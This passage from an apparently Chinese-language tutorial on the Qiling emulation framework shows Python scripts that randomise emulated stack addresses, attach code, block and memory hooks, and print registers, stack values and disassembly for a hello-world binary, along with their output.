<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Hello, Qiling !!!&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Greetings from CoLin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了模拟 ASLR 内存保护，我们需要对 libc 的加载地址、ELF 的加载地址以及堆栈的地址进行一定程度的随机化。由于 ASLR 要求每一次执行的内存地址都不同，因此我们不能将配置文件写死在 ql 文件之中，只能动态生成到字典中。</p>
<p>而对于 Qiling 类构造函数的参数，需要注意<code>rootfs</code>选项。这里一定要将根目录设置为 ‘/’，如果设置为默认值，那么 qiling 将无法找到加载 ELF 的 <a target="_blank" rel="noopener" href="http://ld.so">ld.so</a> 文件以及 <a target="_blank" rel="noopener" href="http://libc.so">libc.so</a> 文件。</p>
<p>随后，开启执行发现，Qiling 没有完成一些较新的 Linux 系统调用实现。笔者的 libc 版本为 2.35，在加载器加载时会调用 334 号系统调用，而 Qiling 没有实现这个系统调用的替代，因此导致该系统调用无法正常运行，加载器判定 libc 版本不够。因此下面改为静态编译后运行。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qiling.const</span><br><span class="line"><span class="keyword">import</span> qiling</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">ql: qiling.Qiling</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(ql.mem.get_formatted_mapinfo()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    profile = &#123;</span><br><span class="line">        <span class="string">&quot;OS64&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x5500_0000_0000 ~ 0x56ff_ffff_f000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] = <span class="number">0x8000_0000_0000</span> - <span class="number">0x30000</span> - (randint(<span class="number">0</span>, <span class="number">0x8000_0000</span>) &lt;&lt; <span class="number">12</span>)</span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_size&#x27;</span>] = <span class="number">0x30000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;mmap_address&#x27;</span>] = profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] - <span class="number">0x1000_0000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;profile: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> profile[<span class="string">&#x27;OS64&#x27;</span>].items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(key, <span class="built_in">hex</span>(value)))</span><br><span class="line"></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./hello_qiling&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    emu = qiling.Qiling(</span><br><span class="line">        argv=[<span class="string">&#x27;./hello_qiling&#x27;</span>],</span><br><span class="line">        rootfs=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        ostype=qiling.const.QL_OS.LINUX,</span><br><span class="line">        archtype=qiling.const.QL_ARCH.X8664,</span><br><span class="line">        profile=profile,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">    emu.hook_address(callback, elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">    emu.run()</span><br></pre></td></tr></table></figure>
<p>这里<code>hook_address</code>即在<code>main</code>函数首地址添加 hook。回调函数的第一个参数一定要为 Qiling 对象。<code>ql.mem.get_formatted_mapinfo</code>用于获取工整的内存映射信息字符串。</p>
<p>输出结果：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">profile: </span><br><span class="line">stack_address: 0x7c76907a4000</span><br><span class="line">stack_size: 0x30000</span><br><span class="line">mmap_address: 0x7c76807a4000</span><br><span class="line">[*] &#x27;/home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">0x401775</span><br><span class="line">Start                End                  Perm    Label          Image</span><br><span class="line">000000000000030000 - 000000000000031000   rwx     [GDT]          </span><br><span class="line">000000000000400000 - 000000000000401000   r--     hello_qiling   /home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling</span><br><span class="line">000000000000401000 - 000000000000498000   r-x     hello_qiling   /home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling</span><br><span class="line">000000000000498000 - 0000000000004c1000   r--     hello_qiling   /home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling</span><br><span class="line">0000000000004c1000 - 0000000000004c5000   r--     hello_qiling   /home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling</span><br><span class="line">0000000000004c5000 - 0000000000004cd000   rw-     hello_qiling   /home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling</span><br><span class="line">0000000000004cd000 - 0000000000004cf000   rwx     [hook_mem]     </span><br><span class="line">0000000000004cf000 - 0000000000004d0000   rwx     [brk]          </span><br><span class="line">0000000000004d0000 - 0000000000004f1000   rwx     [brk]          </span><br><span class="line">0000007c76907a4000 - 0000007c76907d4000   rwx     [stack]        </span><br><span class="line">00ffffffffff600000 - 00ffffffffff601000   rwx     [vsyscall]     </span><br><span class="line">Hello, Qiling !!!</span><br><span class="line">Greetings from CoLin</span><br><span class="line">[=] 	arch_prctl(code = 0x3001, addr = 0x7c76907d3e00) = -0x1 (EPERM)</span><br><span class="line">[=] 	brk(inp = 0x0) = 0x4cf000</span><br><span class="line">[=] 	brk(inp = 0x4cfdc0) = 0x4d0000</span><br><span class="line">[=] 	arch_prctl(code = 0x1002, addr = 0x4cf3c0) = 0x0</span><br><span class="line">[=] 	set_tid_address(tidptr = 0x4cf690) = 0x2419</span><br><span class="line">[=] 	set_robust_list(head_ptr = 0x4cf6a0, head_len = 0x18) = 0x0</span><br><span class="line">[!] 	0x44ac4f: syscall ql_syscall_rseq number = 0x14e(334) not implemented</span><br><span class="line">[=] 	uname(buf = 0x7c76907d3b90) = 0x0</span><br><span class="line">[=] 	prlimit64(pid = 0x0, res = 0x3, new_limit = 0x0, old_limit = 0x7c76907d3d10) = 0x0</span><br><span class="line">[=] 	readlink(pathname = 0x4aea98, buf = 0x7c76907d2c50, bufsize = 0x1000) = 0x48</span><br><span class="line">[=] 	getrandom(buf = 0x4cc1f0, buflen = 0x8, flags = 0x1) = 0x8</span><br><span class="line">[=] 	brk(inp = 0x4f1000) = 0x4f1000</span><br><span class="line">[=] 	mprotect(start = 0x4c1000, mlen = 0x4000, prot = 0x1) = 0x0</span><br><span class="line">[=] 	newfstatat(dirfd = 0x1, path = 0x4af37d, buf_ptr = 0x7c76907d3b00, flags = 0x1000) = -0x1 (EPERM)</span><br><span class="line">[=] 	write(fd = 0x1, buf = 0x4d0500, count = 0x27) = 0x27</span><br><span class="line">[=] 	exit_group(code = 0x0) = ?</span><br></pre></td></tr></table></figure>
<p>对于静态编译的程序，其 ELF 加载地址是固定的，但我们对栈地址完成了随机化处理。</p>
<h2 id="a4-hooks"><a class="markdownIt-Anchor" href="#a4-hooks"></a> A.4 Hooks</h2>
<p>Qiling 支持多种程序 Hook，包括内存读写访问、基本块、代码片段、特定指令（只支持 syscall、in、out 等少数几种系统相关指令，Qiling 的一大缺点）。下面使用上面的静态编译程序进行测试，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qiling.const</span><br><span class="line"><span class="keyword">import</span> qiling.core_hooks_types</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_address</span>(<span class="params">ql: qiling.Qiling</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*** Address Hook Callback Function ***&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_code</span>(<span class="params">ql: qiling.Qiling, address: <span class="built_in">int</span>, inst_size: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;*** Code Hook Callback Function: at <span class="subst">&#123;address:#x&#125;</span>, instruction size = <span class="subst">&#123;inst_size&#125;</span> ***&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_basicblock</span>(<span class="params">ql: qiling.Qiling, address: <span class="built_in">int</span>, inst_size: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;*** Basic Block Hook Callback Function: at <span class="subst">&#123;address:#x&#125;</span>, instruction size = <span class="subst">&#123;inst_size&#125;</span> ***&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_memoryFetch</span>(<span class="params">ql: qiling.Qiling, access_type: <span class="built_in">int</span>, address: <span class="built_in">int</span>, memory_size: <span class="built_in">int</span>, value: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;*** Memory Fetch Hook Callback Function: at <span class="subst">&#123;address:#x&#125;</span>, memory size = <span class="subst">&#123;memory_size&#125;</span> ***&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    profile = &#123;</span><br><span class="line">        <span class="string">&quot;OS64&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x5500_0000_0000 ~ 0x56ff_ffff_f000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] = <span class="number">0x8000_0000_0000</span> - <span class="number">0x30000</span> - (randint(<span class="number">0</span>, <span class="number">0x8000_0000</span>) &lt;&lt; <span class="number">12</span>)</span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_size&#x27;</span>] = <span class="number">0x30000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;mmap_address&#x27;</span>] = profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] - <span class="number">0x1000_0000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;profile: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> profile[<span class="string">&#x27;OS64&#x27;</span>].items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(key, <span class="built_in">hex</span>(value)))</span><br><span class="line"></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./hello_qiling&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    emu = qiling.Qiling(</span><br><span class="line">        argv=[<span class="string">&#x27;./hello_qiling&#x27;</span>],</span><br><span class="line">        rootfs=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        ostype=qiling.const.QL_OS.LINUX,</span><br><span class="line">        archtype=qiling.const.QL_ARCH.X8664,</span><br><span class="line">        profile=profile,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    hooks: <span class="built_in">list</span>[qiling.core_hooks_types.HookRet] = [</span><br><span class="line">        emu.hook_address(callback_address, elf.symbols[<span class="string">&#x27;main&#x27;</span>]),</span><br><span class="line">        emu.hook_code(callback_code, begin=elf.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">4</span>, end=elf.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">8</span>),</span><br><span class="line">        emu.hook_block(callback_basicblock, begin=elf.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">0x17</span>, end=elf.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">0x26</span>),</span><br><span class="line">        emu.hook_mem_read(callback_memoryFetch, begin=<span class="number">0x498016</span>, end=<span class="number">0x49802b</span>)</span><br><span class="line">    ]</span><br><span class="line">    emu.run()</span><br></pre></td></tr></table></figure>
<p>这里的<code>hook_code</code>相当于给某个范围内的所有指令前添加 Hook，在不传入<code>begin</code>和<code>end</code>参数的情况下，默认是在整个内存空间操作，即对所有指令添加 Hook。<code>hook_block</code>则是在某个范围内对新找到的基本块添加 Hook。不同的 Hook 的回调函数的参数不太一样，对于内存访问 Hook，其参数包含访问类型、访问地址、访问大小、写入（如果访问为写入操作）的值。当然在创建 Hook 时也可以为回调函数添加其他的参数。</p>
<p>输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">profile: </span><br><span class="line">stack_address: 0x784745fb3000</span><br><span class="line">stack_size: 0x30000</span><br><span class="line">mmap_address: 0x784735fb3000</span><br><span class="line">[*] &#x27;/home/colin/Desktop/misc/CTF-playground/qiling/qiling_learn/hello_qiling&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[=] 	arch_prctl(code = 0x3001, addr = 0x784745fe2e00) = -0x1 (EPERM)</span><br><span class="line">[=] 	brk(inp = 0x0) = 0x4cf000</span><br><span class="line">[=] 	brk(inp = 0x4cfdc0) = 0x4d0000</span><br><span class="line">[=] 	arch_prctl(code = 0x1002, addr = 0x4cf3c0) = 0x0</span><br><span class="line">[=] 	set_tid_address(tidptr = 0x4cf690) = 0x4b1c</span><br><span class="line">[=] 	set_robust_list(head_ptr = 0x4cf6a0, head_len = 0x18) = 0x0</span><br><span class="line">[!] 	0x44ac4f: syscall ql_syscall_rseq number = 0x14e(334) not implemented</span><br><span class="line">[=] 	uname(buf = 0x784745fe2b90) = 0x0</span><br><span class="line">[=] 	prlimit64(pid = 0x0, res = 0x3, new_limit = 0x0, old_limit = 0x784745fe2d10) = 0x0</span><br><span class="line">[=] 	readlink(pathname = 0x4aea98, buf = 0x784745fe1c50, bufsize = 0x1000) = 0x48</span><br><span class="line">[=] 	getrandom(buf = 0x4cc1f0, buflen = 0x8, flags = 0x1) = 0x8</span><br><span class="line">[=] 	brk(inp = 0x4f1000) = 0x4f1000</span><br><span class="line">[=] 	mprotect(start = 0x4c1000, mlen = 0x4000, prot = 0x1) = 0x0</span><br><span class="line">[=] 	newfstatat(dirfd = 0x1, path = 0x4af37d, buf_ptr = 0x784745fe2b00, flags = 0x1000) = -0x1 (EPERM)</span><br><span class="line">[=] 	write(fd = 0x1, buf = 0x4d0500, count = 0x27) = 0x27</span><br><span class="line">[=] 	exit_group(code = 0x0) = ?</span><br><span class="line">*** Address Hook Callback Function ***</span><br><span class="line">*** Code Hook Callback Function: at 0x401779, instruction size = 1 ***</span><br><span class="line">*** Code Hook Callback Function: at 0x40177a, instruction size = 3 ***</span><br><span class="line">*** Code Hook Callback Function: at 0x40177d, instruction size = 7 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498010, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498018, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498020, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498028, memory size = 8 ***</span><br><span class="line">*** Basic Block Hook Callback Function: at 0x40178c, instruction size = 15 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498016, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x49801e, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498020, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498028, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498016, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x49801e, memory size = 8 ***</span><br><span class="line">*** Memory Fetch Hook Callback Function: at 0x498026, memory size = 4 ***</span><br><span class="line">*** Basic Block Hook Callback Function: at 0x40179b, instruction size = 7 ***</span><br><span class="line">Hello, Qiling !!!</span><br><span class="line">Greetings from CoLin</span><br></pre></td></tr></table></figure>
<h2 id="a5-runtime-关键数据"><a class="markdownIt-Anchor" href="#a5-runtime-关键数据"></a> A.5 runtime 关键数据</h2>
<p>runtime 数据包括寄存器值、内存值等。在 pwndbg 中，每一次程序执行中断后都会显示当前 RIP 前后的汇编代码、寄存器值以及堆栈内容。在 qiling 中，这些同样可以实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qiling</span><br><span class="line"><span class="keyword">import</span> qiling.core_hooks_types</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">watch_regs = [<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rbx&#x27;</span>, <span class="string">&#x27;rcx&#x27;</span>, <span class="string">&#x27;rdx&#x27;</span>, <span class="string">&#x27;rsi&#x27;</span>, <span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="string">&#x27;rbp&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;r8&#x27;</span>, <span class="string">&#x27;r9&#x27;</span>, <span class="string">&#x27;r10&#x27;</span>, <span class="string">&#x27;r11&#x27;</span>, <span class="string">&#x27;r12&#x27;</span>, <span class="string">&#x27;r13&#x27;</span>, <span class="string">&#x27;r14&#x27;</span>, <span class="string">&#x27;r15&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback_code</span>(<span class="params">ql: qiling.Qiling, address: <span class="built_in">int</span>, inst_size: <span class="built_in">int</span></span>):</span><br><span class="line">    current_instruction = ql.mem.read(address, inst_size)</span><br><span class="line">    assembly = <span class="built_in">repr</span>(<span class="built_in">next</span>(ql.arch.disassembler.disasm(current_instruction, <span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;address:#x&#125;</span>: <span class="subst">&#123;assembly&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*** REGISTERS ***&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> reg <span class="keyword">in</span> watch_regs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;reg&#125;</span>\t<span class="subst">&#123;ql.arch.regs.read(reg):16x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*** STACK ***&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ql.arch.regs.read(<span class="string">&#x27;rsp&#x27;</span>) + i * <span class="number">8</span>:x&#125;</span>\t<span class="subst">&#123;ql.arch.stack_read(i * <span class="number">8</span>):16x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    profile = &#123;</span><br><span class="line">        <span class="string">&quot;OS64&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x5500_0000_0000 ~ 0x56ff_ffff_f000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] = <span class="number">0x8000_0000_0000</span> - <span class="number">0x30000</span> - (randint(<span class="number">0</span>, <span class="number">0x8000_0000</span>) &lt;&lt; <span class="number">12</span>)</span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_size&#x27;</span>] = <span class="number">0x30000</span></span><br><span class="line">    profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;mmap_address&#x27;</span>] = profile[<span class="string">&#x27;OS64&#x27;</span>][<span class="string">&#x27;stack_address&#x27;</span>] - <span class="number">0x1000_0000</span></span><br><span class="line"></span><br><span class="line">    emu = qiling.Qiling(</span><br><span class="line">        argv=[<span class="string">&#x27;./hello_qiling&#x27;</span>],</span><br><span class="line">        profile=profile</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    hook: qiling.core_hooks_types.HookRet = emu.hook_code(callback_code)</span><br><span class="line">    emu.run()</span><br></pre></td></tr></table></figure>
<p>如上脚本所示，这里的<code>hook_code</code>仅传入了回调函数参数，这使得程序在每执行一条汇编指令后都会调用一次回调函数。在回调函数中，可以通过<code>ql.mem_read</code>方法读取内存中的任意地址处的任意长度值（write 即为写入），返回值为字节数组（bytearray）。在 qiling 中提供了调用 capstone 库进行反汇编的 API：<code>ql.arch.disassembler.disasm</code>，第一个参数为字节数组，第二个参数为偏移量。</p>
<p>对于寄存器值，可以直接通过<code>ql.arch.regs.read</code>传入寄存器名获取寄存器的值（write 即为写入）。如果需要查询当前架构的所有寄存器，可以通过<code>ql.arch.regs.register_mapping</code>获取。</p>
<p>对于堆栈，qiling 也特别设计了 API 便于操作。<code>ql.arch.stack_read</code>用于读取以<code>rsp</code>为基地址的任意偏移量的堆栈值（读取 4/8 字节，取决于字长）。<code>stack_write</code>为写入指定偏移处，<code>stack_push</code>和<code>stack_pop</code>即为直接修改<code>rsp</code>的值，在程序执行外完成 push 和 pop 操作。</p>
<p>部分输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x40166f: &lt;CsInsn 0x0 [67e8db130000]: call 0x13e1&gt;</span><br><span class="line">*** REGISTERS ***</span><br><span class="line">rax	               0</span><br><span class="line">rbx	               0</span><br><span class="line">rcx	               0</span><br><span class="line">rdx	    7f69841ede78</span><br><span class="line">rsi	               1</span><br><span class="line">rdi	          401775</span><br><span class="line">rsp	    7f69841ede60</span><br><span class="line">rbp	               0</span><br><span class="line">r8	               0</span><br><span class="line">r9	               0</span><br><span class="line">r10	               0</span><br><span class="line">r11	               0</span><br><span class="line">r12	               0</span><br><span class="line">r13	               0</span><br><span class="line">r14	               0</span><br><span class="line">r15	               0</span><br><span class="line">*** STACK ***</span><br><span class="line">7f69841ede60	    7f69841ede68</span><br><span class="line">7f69841ede68	               0</span><br><span class="line">7f69841ede70	               1</span><br><span class="line">7f69841ede78	    7f69841edff0</span><br><span class="line">7f69841ede80	               0</span><br><span class="line">7f69841ede88	               0</span><br><span class="line">7f69841ede90	              10</span><br><span class="line">7f69841ede98	         78bfbfd</span><br><span class="line">7f69841edea0	               6</span><br><span class="line">7f69841edea8	            1000</span><br></pre></td></tr></table></figure>
<h2 id="a6-内存"><a class="markdownIt-Anchor" href="#a6-内存"></a> A.6 内存</h2>
